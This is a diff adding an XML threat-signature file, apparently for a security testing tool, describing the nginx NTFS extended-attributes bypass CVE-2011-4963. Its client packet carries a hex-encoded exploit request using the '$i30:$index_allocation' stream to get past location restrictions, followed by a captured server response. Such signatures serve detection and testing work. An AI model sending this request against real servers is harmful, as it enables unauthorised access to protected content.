@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Nginx Location NTFS Extended Attributes Security Bypass"/>
+    <EngDesc display="true" value="A security bypass vulnerability has been reported in Nginx. The vulnerability is due to an error when resources defined by the location directive are accessed via an HTTP request containing directory names with NTFS extended attributes.A remote, unauthenticated attacker can exploit this vulnerability by sending a maliciously crafted request to a vulnerable instance of Nginx. This can result in disclosure of sensitive information."/>
+    <Intent display="true">
+      <item value="Security_Bypass_Vulnerability"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value=""/>
+    <Known_Vendors_Affected display="true">
+      <item value="nginx"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HTTP_Server_for_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_1.2.1"/>
+      <item value="prior_to_1.3.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20121016-02"/>
+    <CVEID display="true" value="CVE-2011-4963"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="84339"/>
+    <Author display="true" value="Cindy"/>
+    <ID display="true" value="988654c348372c3acee26e80c4163264"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634868651562536105"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1351503033" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:2A:7B" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0061" Identification="B57C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="2344" srcIP="$destIP" destIP="172.16.8.180" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="59626" destPort="$HTTPdestPort" SeqNumber="28DF6629" AckNumber="4E678B24" HeaderLength="08" WindowSize="002E" Checksum="077C" UrgentPointer="0000" Options="0101080A2F6ED35300000000" Payload="474554202F74736C3A246933303A24696E6465785F616C6C6F636174696F6E2F20485454502F312E300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:2A:7B" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="019B" Identification="2831" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6F55" srcIP="172.16.8.180" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="59626" SeqNumber="4E678B24" AckNumber="28DF6656" HeaderLength="08" WindowSize="FAC3" Checksum="A515" UrgentPointer="0000" Options="0101080A000AD6F02F6ED353" Payload="485454502F312E3120323030204F4B0D0A5365727665723A206E67696E782F312E322E300D0A446174653A205765642C203137204F637420323031322031353A34363A313920474D540D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A436F6E74656E742D4C656E6774683A203134390D0A4C6173742D4D6F6469666965643A205475652C203136204F637420323031322032303A31343A313520474D540D0A436F6E6E656374696F6E3A20636C6F73650D0A4163636570742D52616E6765733A2062797465730D0A0D0A3C68746D6C3E0A3C686561643E0A3C7469746C653E57656C636F6D6520746F206E67696E78213C2F7469746C653E0A3C2F686561643E0A3C626F6479206267636F6C6F723D2277686974652220746578743D22626C61636B223E0A3C63656E7465723E3C68313E57656C636F6D6520746F2054534C213C2F68313E3C2F63656E7465723E0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
